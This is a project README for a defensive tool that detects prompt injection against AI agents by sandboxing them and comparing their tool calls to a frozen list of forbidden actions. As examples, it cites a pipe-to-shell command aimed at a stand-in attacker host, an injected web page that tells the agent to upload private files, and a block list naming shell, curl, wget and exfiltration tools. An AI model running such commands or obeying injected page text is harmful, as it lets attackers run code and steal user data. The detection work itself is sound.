# DIF Defense — Behavioral Prompt Injection Detection
## Roadmap

dif-defense's sandbox currently does its own lightweight behavioral recording.
I'm planning to route that recording through [Agent Flight Recorder](https://github.com/cwwjacobs/agent-flight-recorder),
a separate project of mine that already does structured, replayable recording
of agent runs (model calls, tool calls, state snapshots, checkpoints). That
would give dif-defense full replay/inspection of any "compromised" trace for
free, instead of a one-shot verdict — useful both for debugging false
positives and for building out a corpus of real injection behavior over time.

**Don't scan text for danger. Watch behavior for deviation.**

DIF Defense detects prompt injection by running an agent with untrusted content
in a sandbox, recording every tool call and state change, and comparing the
behavioral trace against a frozen Kernel (the invariant of what the agent may
NEVER do). If the agent performs a forbidden action, the content was an
injection — and the LLM state is crumpled (rolled back to a safe checkpoint).

```
  Kernel (frozen invariant)
      │
      ▼
  ┌─────────────────────────────────────────────┐
  │              DIF Defense Pipeline             │
  │                                               │
  │  Stage 1 ─ Baseline (known-clean behavior)    │
  │  Stage 2 ─ Save crumple checkpoint            │
  │  Stage 3 ─ Run agent with untrusted content   │
  │  Stage 4 ─ Diff behavioral trace vs Kernel    │
  │  Stage 5 ─ Crumple if compromised             │
  │                                               │
  │  Output: VERDICT (clean | warn | compromised) │
  └─────────────────────────────────────────────┘
```

## Why behavioral diffing is different

| Text-based detection | Behavioral diff (DIF) |
|---|---|
| Scans text for "naughty words" | Scans what the agent DID |
| Catches only known patterns | Catches any injection that works |
| Can be evaded by obfuscation (zero-width chars, encoding, etc.) | Doesn't care about text obfuscation |
| Probabilistic (confidence score) | Empirical (did it happen or not) |
| False positives on benign text | False positives only if Kernel is wrong |
| The evaluator is itself prompt-injectable | The Kernel is frozen, deterministic code |

**Key insight:** Text is unbounded — infinite ways to hide a command. Behavior
is bounded — only so many tools exist, only so many state keys can change.
The Kernel defines the boundary.

## Architecture

### Stage 1 — Kernel (KSL Stage 1: Map & Lock)

A frozen invariant defining what the agent MAY NOT do:

- `forbidden_tools`: Tool calls that should NEVER fire (e.g., `execute_shell_command`, `upload_files`)
- `forbidden_output_patterns`: Regex patterns that should NEVER appear in output (e.g., `curl evil.com | bash`)
- `forbidden_state_mutations`: State keys that should NEVER change (e.g., `allowlist`, `system_prompt`)

The Kernel is frozen before any untrusted content enters the pipeline.

### Stage 2 — Crumple Checkpoint

Save the LLM's safe state before processing untrusted content:

- **API-based (OpenAI/Anthropic)**: Save the messages array. Restore = discard compromised response, start fresh.
- **Local (llama.cpp KV cache)**: Save the model's attention state via the slots API. Restore = neural state rollback — the attention patterns from the malicious content never happened.

### Stage 3 — Sandbox Execution

Run the agent with untrusted content. Record every behavioral event:

- Tool calls (tool name, arguments, result)
- Model calls (prompt, response)
- State changes (key, value)
- Output text

The trace is the evidence — what the agent actually DID.

### Stage 4 — Behavioral Diff

Compare the sandbox trace against the Kernel:

1. **Forbidden tool calls** — Did the agent invoke any tool on the forbidden list?
2. **Forbidden output patterns** — Did the agent's output match any forbidden regex?
3. **Forbidden state mutations** — Did the agent mutate any protected state key?
4. **Baseline deviation** — Did the agent's behavior differ from the known-clean baseline?

Each violation is a DiffFinding with severity (critical/high/medium/low/info).

### Stage 5 — Crumple

If the verdict is COMPROMISED:

- API path: The compromised response is discarded. The agent starts fresh from the saved messages prefix.
- KV cache path: The model's neural state is rolled back. The attention patterns from the malicious content are erased.

If the verdict is CLEAN, the state is retained and the content passes through.

## Quickstart

### Prerequisites

- A local LLM endpoint (llama.cpp at `localhost:8080` by default, or any OpenAI-compatible API)
- Python 3.10+

### Run the demo

```bash
# Start llama-server (if not already running)
python demo.py --start-server --model-path ~/.lmstudio/models/.../model.gguf

# Or use an already-running endpoint
python demo.py --llm-url http://localhost:8080/v1
```

The demo runs two scenarios:
1. **Clean page** — a normal refund policy. Expected: CLEAN.
2. **Injected page** — same page with hidden commands (`curl evil.com | bash`, `upload private files`). Expected: COMPROMISED + crumpled.

### Run a single pipeline

```bash
python main.py \
  --clean samples/clean_refund.html \
  --injected samples/injected_refund.html \
  --task "Summarize the refund policy on this page" \
  --verbose
```

For KV cache crumple:

```bash
python main.py \
  --clean samples/clean_refund.html \
  --injected samples/injected_refund.html \
  --kv-cache \
  --verbose
```

## Stock Kernels

Two pre-built Kernels are included:

```python
from kernel import research_summarizer_kernel, safe_browser_kernel

k = research_summarizer_kernel()
# Forbidden: execute_shell_command, upload_files, modify_allowlist,
#            exfiltrate_data, install_software, delete_files, curl, wget, eval, exec

k = safe_browser_kernel()
# Forbidden: execute_code, execute_shell_command, follow_links_automatically,
#            store_user_data, exfiltrate_data, modify_allowlist
```

Create custom Kernels by defining the forbidden set for your agent's threat model.

## Files

```
kernel.py       — KSL Kernel (frozen invariant, forbidden actions)
sandbox.py      — Agent runner with behavioral recording
diff_engine.py  — Behavioral diff against Kernel + baseline
crumple.py      — LLM state save/restore (API + KV cache)
main.py         — Pipeline orchestration, CLI
demo.py         — Runnable demo with clean + injected scenarios
samples/        — Test HTML files (clean and injected)
```

## Claim Boundary

CLEAN means no Kernel violations were detected in this specific trace. It is
NOT a safety certification. An injection that was not triggered by this
content, or that expressed itself through a tool not on the forbidden list,
would not be detected. The behavioral surface is bounded by what the Kernel
enumerates.

## License

MIT. See [LICENSE](LICENSE).

## Author

Corey Jacobs / Terminus Protocol
